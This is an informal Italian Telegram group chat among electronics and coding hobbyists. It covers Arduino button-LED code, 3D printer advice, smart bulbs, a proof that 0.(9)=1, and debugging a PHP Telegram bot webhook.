So leggere. Se tu leggessi quello che scrivo, leggeresti anche che, secondo me, non è un benefattore di nessun tipo chi fa le cose per proprio tornaconto personale
E secondo me musk lo fa per questo
E di certo, essere il 12° su Forbes non è proprio essere un pezzente ecco
I primi due sono BG e WB, eppure hanno donato in charity più del debito pubblico italiano 
Come li consideri loro?
Donare in carità non vuol dire automaticamente essere un benefattore
No vabbè Maria io esco
Se è per questo, la Rowling ha rinunciato tipo all'80% dei proventi di Harry Potter in favore degli orfano di non so cosa
E vado in leto
Servirebbe un Salviati qua
35 min fa 
Why?
Lei è una benefattrice
🤔e il buon vecchio Bezos invece? a che punto della classifica sta?
E' il primo attualmente
Nah è stato il primo per qualche ora solo perché le azioni di Amazon erano salite di colpo 
e bravo il Mastro Lindo 
Quello ha fatto notizia, ma il primo resta incontrastato zio Bill
vorrei essere un perdente come lui
Serio? È risalito?
il sesto è il patron di Zara
Secondo me al 90% la carità è un atto egoistico per pulirsi la coscienza, oltre che il conto in banca
Immagino non siano attendibilissimi, comunque devi anche contare che BG ha donato un sacco
c'è anche il tizio di Oracle, per la gioia di 
 
Nono è che non ero aggiornato sul fatto che abbia superato i 100B 

Sisi infatti  Tra Bill&Melinda e Buffett fanno a gara
🤔anche "Sudato Ballmer" è in ottima posizione
Finché non c'è Silvio primo io non sarò contento
 mi fa sempre crepare dalle risate questa foto
Why?
 guardalo come era combinato..noo non era nervoso nooooo
Ah 

Ahahahaha
Io ti amo ❤️
(però cè SpotifyConverter che è comodissimo, ancora meglio )
basta lanciare più processi contemporaneamente e gestirli tutti, così per esempio se ne lanci 5 e una canzone dura 5 minuti, ci metti un minuto solo
spe... la Pollio è in don matteo? 🤯
Dio
Mi sa che c'è un errore 
(versione rivisitata di "Jon there's an unplugged cable, go fix it")
Se una avesse un bug, andando avanti i bug si moltiplicherebbero
una sorta di mutamento genetico, se lo vogliamo chiamare così
Nel momento in cui si proverà che il robot ha una piena coscenza di sè, che non è stata influenzata da un umano, si potrà definire essere vivente
ma cos'hai contro di loro hahahahaha
almeno risparmia il Project Zero
Si
Cancella prima che lui possa leggere
Fallo per la tua incolumità
ho scritto qualcosa di sbagliato?
lol
ero sicuro di quello che stavo dicendo, rip
Non è un ingegnere, è un fisico (teorico perché è pazzo)
ah ops
Madonna ti uccide
ci metterà poco a leggere il log dei messaggi tanto, la mia esistenza è giunta agli sgoccioli
RIP
Tipo io, Roberto, Francesco, Corrado, Ciro e Davide?
frecciatina nr.3 
se me lo dici così 
ah, niente di grave 
Ragazzi qualcuno mi aiuta a configurare l'MQTT tra il sonoff e una app 
AHAHAHAH
Solo perché non l'hai provato 
tu prova 
 
A me non ha funzionato rip 
why?
"Impossibile connettersi con queste credenziali"

Possibilissimo
Raga, come posso caricare delle Lipo 1s 3.7v da 2000mAh?
Too late 
Sto caricando il supermegacannone a ban istantaneo

AIA
3... 2.... 1...
Sei un fisico?
Già
Che campo di studi?
Studente di fisica eh
Triennale?
So' ggiovane ancora
Yeah
Aaaaah
Io sono indeciso tra fisica e matematica, ma penso matematica 
Fai fisica
Cioè, devi vedere se ti piace l'idea di fare laboratorio
Teoria>>
Perché alla fine è praticamente l'unica differenza, visto che a matematica puoi frequentare un botto di corsi di fisica

Io proverò ad entrare alla Normale🤞
Ecco allora è proprio l'unica differenza

Visto che lì hai anche i corsi interni
Si, molti
A me interessano i modelli matematici per la cosmologia
Pureammeeeeeeeeeee
Yeah I know
Adoro
Quindi se ti dicessi "geometrie di minkowski" verresti
Varietà semi-riemanniane
Superfici di Riemann 
Tensore metrico di Ricci
Di dove sei?
(preservazione delle supersimmetrie)
(rinormalizzazione della meccanica quantistica)
Napoli
AAAAAAAH
rip
E se tipo dicessi fibrati?
Connessioni di gauge

Fibrato cotangente allo spazio delle fasi
Forma di Poincaré-Cartan
Woo Napoli città? Che liceo in caso?
Numeri ipercomplessi
Yes, vicino barra, liceo linguistico
Hapitoh
Cioè spe, tu fai il linguistico?
Si
Ush 

schif

 te che squola fai?
University of Physics
E poi ci sono io che avrei linearizzato tutto e risolto alla cazzo in 3 minuti
Eh no, avevi angoli da 0 a 180 in pratica
Potrei proporre a Samsung un ups per le linee di produzione?
Dovete acquistare un SSD? Fatelo di corsa perché un blackout nella fabbrica Samsung ha mandato in fumo il 3.5% della produzione mondiale di NAND flash del mese di marzo... Quindi facilmente i prezzi lieviteranno come quelli delle GPU
Si guarda infatti 
Ho un amica che lavora in WD ad Ayutthaya, Thailand.
Dovrei usarlo di più questo gancio
Madonna 30 minuti down è un eternità
Ah ok
ragazzi sono con la classe ad un laboratorio di "robotica e programmazione" 
arriviamo
e c'è il mindstorm
e la programmazione consiste nell'usare l'editor a mattoncini e scracth
programmazione lv. advanced
Sto facendo un compito a scuola in cui premendo un pulsante si accende il led e ripremendo si spegne, non riesco a fare il programma, potete aiutarmi?
 sai dare una mano? 
Va beh va bene per i percorsi logici xD
Promuovi l'aiuto  a casa durante gli esami?
Basta che fai un while(ciao) con dentro ciao=digitalRead(Pin del bottone) e prima fai digitalWrite(pin del led da accendere)
Il problema è che ancora non abbiamo fatto il while
Non credo stia facendo una verifica
È un esercitazione
Non credo che funzioni cosi haha
Si, funziona così
Mmmmmmmm quasi quasi
Ma while ancora non ce lo spiega
Ma hai letto che deve fare? Il tuo resta acceso fintanto che è premuto il tasto
Eh, sto pensando come fare, l'if l'avete fatto?
Infatti lo devi fare con if
Si
Ah, ops ho letto male mi sa
Ehi, l'avevamo fatto insieme
Ho ancora il codice da qualche parte su github credo
Con l'if giusto?
Yyp
Io faccio il ganzo ma non lo so fare sto codice
Il qui presente ale83ss l'ha fatto invece
Fai una variabile esterna booleana. Così la prima volta che premi la imposti a true. Poi fai un if che se la variabile è true accendi il led. L'opposto per farla spegnere
Risolto grazie lo stesso
Stavo scrivendo il codice ma da telefono sono lento

Esci il codice ahahha
Okay, lo scrivo ci impiegheró un po' dal cellulare
var=digitalRead(Pin bottone);

if(var==HIGH)
{
  digitalWrite(pin led,HIGH);
}
else
{
  digitalWrite(pin led,LOW);
}
In teoria è cosi (ovviamente tutto nel loop)
Nope 
Lol
Mhhh sto pensando
Mi sono dimenticato come si fa, ma ora cerco di ricordarmelo
Non gli lasci niente a questi ragazzi, dopo un mese non li sanno più fare... O che è
Per me ti servono 2 if
Ho preso 10 comunque sono io che sono mezzo malato anche e magari non mi viene in mente come fare
Sto pensando
Alla fine ho fatto così
Ah si che stupido, come l'ho fatto io lo tiene acceso finché lo tiene premuto
Yup
ho appena finito la verifica sui piani cartesiani
ho combinato una merda
Che hacker
 lo prendi?

Guardate come hanno disegnato bene la bandiera italiana con paint 
Eh vabbè
Anche sul raspberry è in italiano?
A quanto pare funziona
Professional
Io lo prenderei se funzionasse il controllo per le smarthome
Ma quelli di Google pensano che in Italia le smarthome non esistano...
Perché qualcuno ha la casa smart?
Sì
Un mio amico sta comprando una Philips HUE al giorno praticamente
Io ho un paio di stanze smart
Ironia
Di cui la mia che non è più smart perché ho bruciato l'Arduino principale, appena finisco la sessione di compiti in classe vedo di cambiarlo
Habemus motherboardem
eccomi qui presente
Ne dovevi comprare di più mi sa 
A me sono arrivate queste presa 1 a 6€ mi sembra

Soluzione alle luci...
Che sono le xiaomi pholips tarocche, volevo scoprire se c'era un modo per usarle diverso dal mi home cinese ahahha
Basta dirlo in inglese
Ne ho altri, però non ho tempo materiale per cambiarlo
insomma, mica tanto..un pò di pancetta ce l'ha 
piano con le offese studente di fisica vai a dirglielo ad un altro
tu sei un dottore
Ci perdo un'oretta a scrivere le chiavi AES sulla EEPROM, a flashare il firmware e saldarlo...
Ma sull'arduino ?
Eh sì
facoltà di Fisica..la materia più inutile del mondo  vero 
? anche tu sei un merendinaio come quelli di Psicologia, ammettilo
Mega?
nano
Ok
ci sono i miei commenti in quell'articolo 
strappatemi gli occhi..L'Ipad usato a scuola per appunti e programmazione con tastiera esterna
🤔qui sento preponderante lo zampino di Ligas
il nostro caro Genny
❤
Deo gratias
Per prendere appunti è ottimo, sempre se non ti crasha la tastiera

io se non ho almeno un 15 pollici divento cieco
È geniale
No beh, si legge bene...ti dico la mia esperienza, per uno studente prendere appunti è comodo
La scomodità principale sta nel fatto che non ti rimane un cazzo in testa, ed difficile studiarli
Dovresti stamparteli e allora sarebbe perfetto, ma nessuno se li stampa
A che servono i surface
infatti a me nn piacciono, odio i portatili incollati su cui non posso mettere mano..io ho solamente portatili professionali (Thinkpad, Dell Latitude, Santech R39) + un Asus X54
Invece hai idea se le Philips yeelight si possono comandare con qualcosa di diverso da mi home?
Va beh dipende dal peso e dalle dimensioni, a me non piacciono i tablet apple e android
le Xiaomi casomai..ci dovrebbero essere altre app oltre a Mi Home, e sono compatibili con Assistant..se vai sul blog di Vincenzo Caputo trovi tutto
Sono Philips xiaomi
🤔davvero? non lo sapevo..hanno fatto una collaborazione?
🤔ma sono compatibili con app? non vorrei fossero le lampade normali a led
Certo con mi home le comando
ah ok ci dovrebbero essere altre app compatibili
Questo con mi home, però non ho trovato altre app
eh bò, cerca online oppure tra le consigliate del play store
Le lampadine Xiaomi sono open source? E quando me lo dite?
🤔 dovrebbero essere open source..mi pare siano compatibili anche con Tasker..sicuro sono compatibili con Assistant
Se sono open source sai già a cosa penso
Ma wait, sono Wi-Fi?
Raga ma Google home da oggi italiano
Sì ma è abbastanza una delusione per ora
Qualcuno ha testato?
yes
Non c'è il controllo domotico in italiano
vuoi integrarle in Switchando
Ah, peccato... Mi sarei fatto tutta la casa con le lampade Xiaomi

Ti costano una cifra
Se hanno il Wi-Fi consumano troppo da spente...
Nn ho mai capite le lampadina Xiaomi, ma si possono usare entrambi lati sia app che interruttore fisico ? E lo stato nel app viene aggiornato
Se le spegni dall'interruttore non puoi riaccenderle dall'app
Na cagata totale
Come altro pensavi di fare?
L'alternativa è rifare l'impianto elettrico
Noo, megli il mio caro sonoff 
Non hai la lampadina RGBAW però
Metti led, lampadina RGBW e una frociata
A me interesserebbero le lamladine AW (o (WW)W) (amber + white o warm white + white)
Solo bianco ma con temperatura regolabile
È diversamente comoda, dalla app regoli il colore e la luminosità e poi la accendi e spengi dall'interruttore ahhaha
Come la lampada che uso per leggere fatta con una striscia RGBA
Esattamente, la loro idea è quella
Divertente ma nn proprio funzionale al massimo
Comunque con la scuola abbiamo iniziato un progetto con Arduino, dobbiamo fare una sorta di Sonoff che però va in Bluetooth
Si connette in Bluetooth col telefono per controllare le luci...
Non la loro idea, se de devi stare a prendere il cell per accenderla sempre stai fresco
Senza offesa ma è na caxxata 
Nono non mi offendo
Lo è ma per il nostro prof è tecnologia avanzatissima
anche le Hue funzionano cosi..infatti hanno anche il telecomandino fisico da attaccare accanto all'interruttore
Al posto dell'interruttore*
Scommetto che userete il modulo Bluetooth HC-06
Sicuramente, il prof dice che abbiamo già tutto

Arduino NANO, Bluetooth e relè
Perché non proponi di farlo col wi-fi?
Sempre la stessa roba 
 ma non c'è neanche da pensarci su! Klingon tutta la vita!
Certo...oramai se le inventano tutte per gonfiare i prezzi, appena iniziano ad essere decenti
A 10 euro un WD da 250gb
Sarebbe altrecose 
Non male
In totale... non più di 150€
Compreso SSD?
Beh compreso ssd siamo sui 180
Anche di meno
160-70
Prezzo giusto dai
Facendo bene i conti
Si dai
Cos? Ne avevamo parlato su switchando, comunque c'è l'api open
Comunque avevo calcolato, visto che ne ho una decina in casa, che costano a grandi linee 1,2 euro all'anno ognuna. Le ultime uscite consumano la metà.
Manca qualcosa...
Meglio se manca
Superiori giusto?
Sì, alternanza con JA Italia
L'anno scorso (3 media ma già andavo il pomeriggio alle superiori) avevamo fatto apio
Abbiamo 1 Nao e prossimamente ne arriva un'altro
Campanella automatizzata con Arduino che scala 5secondi al giorno

Quando la fibra funziona 
Che poi in realtà sta solo scaricando a 45Mbps però c'ha messo di più winrar a estrarre lo zip che torrent a scaricarlo 
Che nerviiiiiii
Io dovrei avere la fibra e ho 2.6...
❤️
Help
Non so fare un voltometro
Un tester costa 15€
piu che la fibra gli altri peer hanno una connessione decente
ma che processore marcio hai?
Su raspbian trovi sempre i peer potenti
up 1kbps u.u
Domanda: Esiste un surrogato di arduino che posso controllare con java?
Volendo anche con Arduino puoi usare Java sul PC fai un codice su Arduino che tramite seriale dialoga con il programma in Java sul pc
Di fatti sto chiedendo se c'è qualcosa fatto apposta per java
Non proprio però potrebbe anche andare bene così
magari se c'è qualcosa di più semplice, ma il concetto credo sia questo
ma come faccio poi con i motori e tutta quella roba che vuole librerie e simili?
raspberry potrebbe farlo?
e come gestisco output ed input?
 quello zaino è fottutamente fantastico 
io dicevo usare direttamente rasp come "arduino"
Qui si rapinano le poste.
anzi
come devo fare?
Rasp ha cose per controllare i pin?
Forse é meglio una libreria o imparare c
In teoria dovrei circa averla
 a proposito di fibra
 TIM: Antitrust: Multa da 4,8 milioni per pubblicità ingannevole sulla fibra ottica, non ha informato adeguatamente i consumatori
oh alleluia
quanto odio quelle pubblicità, si vede lontano un miglio che sono false
te l'avevo detto..poi fammi qualche foto e fammi sapere come ti trovi
Madonna l'ho riempito
Ho riscontrato solo un problema
 era ora
cioè?
Il PC....
Non ha lo spazio apposito
Quindi l'ho avvolto in una coperta
Così almeno non balla
ragazzi sapete dove posso trovare una GTX 1060 a poco?
🤔vero..io uso una custodia con la zip per i miei..però è troppo comodo ed enorme, vero?
Lo adoro 
Appena posso mando qualche foto
te l'avevo detto che ti sarebbe piaciuto
ok manda manda che le guardo stasera, sto uscendo
Buon divertimento 
Quasi finito, peccato che uscita gola rotta
la hai presa su gearbest?
quando tempo si impiega a flashare tasmota sul sonoff con il metodo wifi? è da un po' che ci sto dietro, ma non si muove
Gola rotta?
Ma è l'A8?
Si
Che significa?🧐
AH CHE DOLORE
Infarto incoming
Se sono i nuovi nn si può più via ota
ah fantastico..
Peccato preso già su Amazon
Comunque io tipo vorrei comprarla
Scusate, sto provando a comandare un relay con hc 05 via voce ma non va, ho seguito tutto quello che c'è su progetti Arduino, qualcuno può darmi una mano?
Scrivi al venditore, a me arrivò con un giunto flessibile rotto... Rimborso parziale di 25€
Però se dovrei trovare un pezzo rotto non è che saprei aggiustarla anche se di solito sono smanettone con parecchie cose che compro però ho paura della difficoltà di tutta sta roba
Ci provo
Argomentato bene con foto
La aggiusti, tranquillo
Ah poi ho visto un sacco di recensioni che parlavano di INCENDIO CIOE WOTTT
E quindi mi sto sempre di più tirando indietro
A me si è bruciato l'alimentatore
Colpa dell interruttore 110/220 scommetto
Nah, colpa di qualche saldatura saltata
ah
E tipo quanto costa uno nuovo?
Boh io lo ho riparato, nuovo dai 13€ in su
Giusto per una curiosità: ma come l'hai riparato? Cioè cosa si è rotto?
*faccio elettronica: starter pack*
Un ntc di protezione, poi ho rifatto tutte le saldature cinesi... E ora va
Ah allora non si è bruciato
Il componente è bruciato, guarda in basso a sinistra, si è proprio staccato... Se avevi capito incendio beh difficile che succeda... Dovresti avere cose parecchio infiammabili vicino
E che filamento hai comprato?
?
Per stampare
Che tipo di filamento hai comprato?
Scusa se ti rompo però VOGLIO SAPERE TUTTOHH
Per ora sto utilizzando un sunlu pla+ da Amazon, costa poco e va benino... Ma c'è di meglio da venditori italiani... Però per quelli chiedi a 

Un aiutino?
Altri consigli tecnici? Tipo ho sentito che le cinghie fanno schifo, che è impossibile da assemblare, che l'asse z non va mai dritto ecc
Aspetta io non ho un anet a8
Ah giusto
Tu che hai?
Ho speso un po' di più e preso una cr 10, costa un po' di più ma la struttura è più stabile... Anche quella ha i suoi problemi certo
Anche la cr 10 mini è carina la ha 

yes!
Aiuto
Anche se oggi non la comprerei, i prezzi ultimamente sono pazzi
Io l'avevo presa a 250
Hai visto quanto costa ora
20€ di più
Da banggood da gb sta a 330€
Un po' ?
Quasi il doppio
Anche più del doppio, dei periodi la anet la portavi a casa con 100€...
Solo che per farla stampare bene ed essere affidabile nel tempo devi comprare un nuovo telaio come il tatara, il p3steel o am8
Eh si
Intendi la A8?
Si
Io avevo ordinato un'Anet a8 ma non mi è mai arrivata
Rimborso way
Alla lunga quel telaio si rompe
Si ho visto che ci sono dei telai in alluminio
Cucù
Voltometro oled
Sì ma ti costa 100€ quel telaio..
VOLT_O_METRO
Beh quindi tu dici meglio comprare una cr-10 oggi che modificare un a8 domani?
Dico che la anet a8 va seguita di più, ha bisogno di modifiche nel tempo e molti componenti hanno difetti o sono proprio dimensionati male
Mh okay
Dipende da quello che vuoi, se vuoi una stampante per iniziare  e giocarci e migliorarla tutta da te va bene la anet, sennò valutare di spendere un po' di più e cercare qualcosa con un telaio migliore in partenza...
Su amazon spessissimo sono in offerta lampo le anicubic delta linear plus e i3 mega... E sono delle belle macchine
Non so perché vorrei qualcosa su cui smanettare però ho paura di combinare casini o bestemmiare troppo
Eh chiedi a 
Dipende quanto bestemmi forte
Se qualcosa si rompe,tanto
Si rompe qualcosa è sicuro
Dici che rischio la scomunica?
Dico che la devi prendere a gioco
Vabbè si come passatempo
Magari estivo
Io vado al mare 
Vabbè anche io
Tipo ora
Vorrei un po' di estate
controlla queste





 

che ogni 2 settimane vanno in offerta lampo e non sono per niente male come macchine
Comunque prendila, bestemmi un po' e intanto impari, trattala bene e lei ti tratterà di merda.
Basta evitare di spenderci troppi soldi, al massimo avrai solo perso un po' ditempo e un centinaio di euro.
se la tratti male invece... lì sì che prende fuoco :D
*guarda i prezzi*
Cioè la prima ancora ancora
Ma 400 euro sono un po' troppi🧐
la seconda arriva a 320
"trattala bene e lei ti tratterà di merda": incoraggiante
Ripeto prendi quella meno costosa, così impari come funziona e nel caso non ti piacesse  puoi sempre lasciarla a prender polver senza troppo rammarico.
Si hai ragione
bhe a me è arrivata con un pezzo rotto, dopo una settimana se ne è rotto un altro, nel mentre ho fallito delle stampe e dovuto fare piccole riparazioni :D

Le piccole riparazioni, a me, sono costate 40 euro
io ho rotto un giunto elastico e un alimentatore :D
Geekbuying è affidabile?
Yep
Quasi quasi
non ci ho mai comprato perché è più caro, ma dovrebbe essere + affidabile di gb
Comunque grazie a tutti poi vi faccio sapere
Dovessi* 
Salvatemi
salvatemi dall'invasione di roba che sta qua
ormai su questa scrivania non ci sta più nulla
Non posso...ero messo peggio
io a sinistra ho la stampante 3d, a destra una montagna di componenti, la foto che ho inviato non è nulla, e al centro ho la tastiera e il mouse, dietro al monitor poi c'ho amplificatori e schede che ho cannibalizzato e ora uso come moduli bluetooth, e poi anche acetone e abs.....e anche casse stuprate varie
Meglio non ti dico cosa avessi io... Mi è servito il trasloco per sistemare
ma in compenso ho il portapenne stampato in abs con il pi scritto tutto attorno
La stampante 3D mi manca ancora...
Rido
è bellixximoo
Siii
Ah son bannate le gif?
già
Volevo farvi vedere la stampante
Here
Quello che perdeva lettereee

Ma ci vuole un sacco a stamparlo
già, comunque le lettere le ho riattaccate
Io però pensavo di fare la versione chiusa
beh ma non è così figa, questo fa mooolto più figo
Si ma in quello ci passa aria xD
e quindi
Ci si incastra la roba, non mi convince lo vedo anche fragile
fragile non è di sicuro, è molto elastico più che altro
poi io lo tengo in camera quindi...al massimo tra 99 anni lo ripulirò con l'acqua, non che faccia alcun male all'abs :P
Ma io ho solo pla
saaaaad, allora non ci provare nemmeno, ti cade per terra e si desfa
Però ho fatto lo schiaccianoci e non fa una piega e dato che a nonna fa comodo perché lo usa meglio di quello di ferro mi ha dato 50€ di mancia
50 euro di mancia...*in cibo*
Ehh
Comunque non la usi molto questa stampante, hai sistemato il connettore del bed?
Yeep
Saldato
Come e non hai inviato la foto del lavoro xD
in realtà la uso moolto spesso, solo che qua invio solo alcuni progetti, non tutti altrimenti spammo
Ehhh fammi vedere qualcosa va ahah
ed ecco il microscopio interamente stampato in 3d
poi ho la robba per il rasp, ora preparavo qualcosa per il progetto del tandem
e altro
Ah fico xD
Bella, io vado da mkiappola 
Bravo hai vinto il premio per la qualifica nell' accademia della crusca genio
Posso fare una GTX 1080 ti con la stampante 3D?
Rip
Ma dove si trova il Raspberry Pi 3 b+?
Non offendere l'italiano
Su Amazon non c’è
come stai?
Bene sto a casa
Oggi sono anche andato a scuola
Ottimo
Ma che cazz
ma ahahahahah
Ragà ma 0.9periodico = 1 ?
 tu che ne sai abbastanza
Si
Però ho pensato, se sulla retta dei numeri tu disegni 1.9 periodico sarà sempre un po' più indietro di 1
Trova il numero che sommato a 0.9 periodico dà 1
0+
0.1 periodico?
non lo trovi, dovresti avere 0 seguito da infiniti zeri decimali e alla fine 1
eh no
Uhm
Capito
Ci sono rimasto di merda lol

io l'ho chiesto al mio prof una volta e ci ha pensato per mezz'ora
Ma comeee
È il numero x che tende a 0+
 A whisper message to pesaventofilippo, Only he/she can open it.
Ssssh
HAHAHAHAHAHAHA ma daiii
C'è scritto questo bot è bello
 A whisper message to all, Only he/she can open it.
 A whisper message to overvolt\_grouphelp\_bot, Only he/she can open it.
Rip non va
uhm... se taggo un username che non esiste nessuno può leggerlo però 🤔
🤔Saldatore Lafayette?
ti svelo un segreto basta mettere una mensola oppure un rialzo per monitor, tipo quelli in legno che usano per le tv
mandami qualche foto dettagliata delle zone ed una-due dove si vede l'intera scrivania e ti aiuto io
Yup
Eh no, I numeri reali non comprendono gli infinitesimi
Deriva tutto dagli assiomi scelti per la costruzione dell'insieme dei numeri ideali come un campo ordinato e completo
Cicca più fatti e meno pugnette..qua le cose devi spiegarle in parole povere
Il motivo più "semplice" per convincersi che 0.(9)=1 è trasformarlo in frazione con le regole che si imparano già alle medie... Un numero periodico è una frazione che ha al numeratore la differenza tra il numero privato della virgola e il numero senza periodo e al denominatore tanti nove quante sono le cifre del periodo e tanti zeri quante sono le cifre dell'antiperiodo... Nel nostro caso (9-0)/(9)=9/9=1
Un altro metodo molto semplice consiste nel provare a calcolare quanto fa 0.(3)*3... Fa 0.(9)... Ma 0.(3)=1/3 e 1/3*3 =1, quindi 0.(9)=1
Ma la rigorosità di questi metodi è alquanto discutibile...
Una dimostrazione più rigorosa richiede invece l'uso di una successione di numeri, di cui 0.(9) è l'estremo superiore, e si dimostra che l'estremo superiore della successione delle differenze tra la successione di partenza e 1 è 0, ma poiché la successione è strettamente minore di uno ecc ecc ecc
ma queste cose te le hanno insegnate? ahahha
Eh sì 
Circa almeno
davvero? 
Da qualche parte ho gli appunti di sta roba
Ma boh poi si fanno a sentimento
🤔menomale che ti avevo detto "chiaro e conciso"..e se ti dicevo "prolisso" che scrivevi, la Divina Commedia di matematica?

In pratica, l'insieme dei numeri reali ha un certo numero di assiomi. Uno dei quali, il cosiddetto "postulato di archimede" dice che se prendi due qualsiasi numeri reali "a" e "b" tali che a<b, esisteranno sempre due numeri naturali m e n tali che ma>nb. Se a fosse un infinitesimo, ciò non potrebbe avvenire. Dunque, gli infinitesimi non fanno parte dei numeri reali. E questo porta tutti i casini di analisi tipo la definizione di limite ecc... Negli anni settanta del Novecento si è sviluppata la cosiddetta "analisi non standard" che in pratica modifica l'assiomatica dei numeri reali per includere anche gli infinitesimi e definendo tutto a partire da quelli (un po' alla Newton)
❤
analisi non standard piaceva tanto a qualche mio prof 
È tanta roba
Finalmente non ti guardano storto quando "semplifichi il dx"
è una maniera più fisica di definizione della derivata
 ti vedo bene come prof universitario..saresti il "Terrore di Trento"
ahahah no per me sarebbe solo buono come il pane

   no vabbè, Doctor Strange e Iron Man sono i miei idoli..Cumberbatch è azzeccatissimo per quel ruolo 
Eh temo pure io
Ovvio 
poi, cioè, Cicca non puó fare il prof
l'università ha posti limitati 
Ma chissene, cacciano il preside e ci mettono cicca
Sbaglio o si può dimostrare anche come limite?
AHAHAHAHHAHAHAHAH
Devi prima definire il limite..
Purtroppo non ho fatto analisi non standard  ):
Manco io 
Ah
Con queste cose qui è meglio evitare i limiti proprio perché vengono definiti girandoci attorno per evitare gli infinitesmi
Vero, pensandoci hai ragione
Io e le dimostrazioni non andiamo molto d'accordo 
Anche se amo quelle per assurdo
E allora vieni a far fisica
Per ora non andiamo d'accordo u.u
Ho tipo 3 libri di matematica da finire.. help
Più uno di fisica teorica
Ma ho le interrogazioni di lingue...
About?
Analisi 1 de marco
Algebra lineare abate 
Introduzione alla topologia generale 

La strada che porta alla realtà, dalle radici ai fibrati di gauge
Minghia

ma per gli studenti dico 
WTF
Che facoltà
4 anno liceo linguistico
Perché quei libri
Perché mi preparo alla Normale
Eh probabilmente servono tutti ahahah, per quale facoltà?
Matematica 
Ma la parte più bella è "se li studi ora, ti ricorderai qualcosa fra 2 anni?"
La mitica normale, l'uni in cui come media per fare la triennale ce ne voliono 5 di anni, e poi qundo esci o fai ricerca o fatichi a trovare lavoro
Ora studio questo, tra anno spero di arrivare ad analisi 2 e algebra astratta 
Io farò ricerca
E tecnicamente o ci riesci in 3 anni o ti espellono
Tecnicamente sono tutti in corso e seguono l'uni di pisa
^
Sottomarca brutale
Ma io non avrei manco saputo scrivere il nome in quel test, e nemmeno ora lo saprei fare ahhahah
È la morte.
Ma nemmeno il s.anna, dopo che ho fatto ingegneria
HELP
Ma la domanda è, come ha fatto ha scorgere qualcosa in quel marasma di roba ahah
Beh beh wait, sono sulle dolomiti al moment
Però se vuoi ti affitto casa se non entri hahaha
Aww
Se sei ing elettronico mi va benissimo
Beh...quasi....sono appena sceso e ora siamo in un autogrill, tra 100km ci siamo, road for cortina d'ampezzo
Ti va male sono chimico, al massimo puoi fare la birra
Va bene comunque u.u
Buongiorno guyss
Avete da consigliarmi un buon smartband/smartwatch per la palestra? Fondamentalmente, ho bisogno di un dispositivo che mi conti le calorie bruciate, i passi, quindi distanza percorsa e cardio, se ci riesce ad entrare nel prezzo che è 30-35€
Comunque se ti riesce capire da solo quei libri sei ad un buon punto
Per analisi 2 gli studenti a pisa utilizzavano degli appunti... Comunque c'è un corso di analisi 1 e 2 con video e appunti scritti gratuito e online se vuoi
Si, ora sono ai complessi con i libri dell'uni, e agli integrali con quelli scolastici (tutto da solo)

Magari 
Miband 2
Ho visto.. Nonostante sia uscito un po' di tempo fa, è ancora funzionale oggi?
secondo me non è adatto, non è preciso, servono prodotti di altri prezzi
Ad esempio?
ecco qua ci sono appunti/libri



qua il video corso per analisi 1 e 2 e qualche corso aggiuntivo


non ne ho idea, so solo che il miband da valori abbastanza a caso :D
Ah perfetto hahhaha
Sisi... Io mi trovo benissimo
Grazieee

Ah gobbino❤️
?
Lo conosco
ah sì, ha tenuto i corsi a matematica, quindi i ragazzi della normale hanno seguito quel corso

Ragazzi ma perché le stampanti 3d delta sembrano evitate??
Com'è nelle misurazioni? Preciso?
Si
Molto
Ogni tanto gli prende il matto... Però ogni veramente poco
Mh grazie
Se avete altri dispositivi da consigliare, consigliate
Su 100 passi  sbaglia anche di 20 non ha giroscopio... Bah
Mh... A me non succede
Di solito è strapreciso
Per le calorie? Com'è?
Abbastanza buono
Comunque se devi fare palestra io ti consiglierei più un fitbit
Costa parecchio dippiú ma è fatto apposta
oops
ero l'unico in tutto il mondo col codice originale iboot ancora online 
Ciao a tutti ce qualche esperto di bitcoin?
Dipende sotto che aspetto
Stavo per linkare il tuo video ahahah
new photo 
?
profilo
O yes
Bella?
yuup
Cheebbella la vita, niente matematica, niente fisica, niente chimica, sooolo neve e ipotermia
Wow bello
Il primo giorno però
Beh sto qua solo oggi e domani...e lunedì casualmente avrò male alle gambe tanto da non riuscire ad andare a scuola
Quel casualmente mi piace particolarmente 
Eeee se magna il capriolo
 un giorno pure te lo devi magnare un capriolo buono, viecci a fare un giro sulle dolomiti 'na volta tanto
Beato te
Scusate qui nel gruppo c'è qualcuno che si intenda di programmazione in php di bot telegram,? perché avrei un problema?
Mah, il perché hai un problema lo sai solo tu, poi chiedi pure
scusa ho sbagliato a scrivere XD
Mr Python -> Bot PHP
sono bravo in python ma sto imparando in php
Magari ha il mio stesso problema: no money per una vps, e quindi si va di webhosting gratis che generalmente supportano php e non python
comunque questo è il problema, ho un bot ho settato un webHook, con l'apposita istruzione, adesso sto accedendo all array in cui è contenuta la cronologia della chat ma non mi  il chat id stampa, ecco il codice
<?php



$token="fhifhireijreijijoerijoreijoijoreiojrejoirioj";

$website="
".$token;

$updates=file_get_contents("php://input");
$array=json_decode($updates);

$id=$array["message"]["chat"]["id"];


echo($id);








?>
Cosa speri che faccia se è un WebHook?
ma non posso stampare un campo del array che mi viene restituito?
Puoi fartelo inviare come messaggio
come?
ma quindi con i webHook un operazione del genere  è impossibile?
come faccio?
Con una richiesta HTTP alle API di Telegram con il metodo 
ok ma ci ho provato e non mi invia niente
?php



$token="";

$website="
".$token;

$updates=file_get_contents("php://input");
$array=json_decode($updates);

$id=$array["message"]["chat"]["id"];


$updates=file_get_contents($website."
?chat_id=".$id."&text="."ciao");
non funziona
Hai impostato il certificato SSL?
si il mio dominio ha https
uso altervista quindi con cloudflare
Allora sarà la cache di Cloudfare
cosa devo fare quindi?
cancello la cache
?
Non funziona, o ti mandi un messaggio o salvi su un file
ho provato entrambi i metodi ma niente se salvo l'array sul file mi ritrovo il file vuoto
Gli array non puoi salvarli direttamente, li devi convertire in stringa
Ciao a tutti
⚠ ATTENZIONE ⚠

Il pump&dump nella borsa è ILLEGALE. È più illegale di Girada, addirittura.
Negli ultimi tempi c'è questa gente che entra a spammare i propri canali di pump&dump, e possono sembrare dei bravi tizi che vi vogliono dare consigli sulle criptovalute... E può sembrare figo il fatto di organizzarsi per comprare tutti contemporaneamente una criptovaluta e realizzare profitto in questo modo. MA IN BORSA QUESTA COSA È UN REATO. Quindi quando entrano sti tizi a spammare non entrate nei loro canali e anzi, cercate di segnalarceli tempestivamente.




Benvenuto 
Grazie
l'ho fatto  ma niente non funziona
Qualcuno sa dirmi se esistono anvora in italia le carte prepagate bitcoin da acquistare al tabaccaio?
Prova a salvare direttamente $update su file. Quando mandi il messaggio non aprire la pagina .php ma direttamente il file
sembra quasi che sia vuota
il file è vuoto quando lo apro
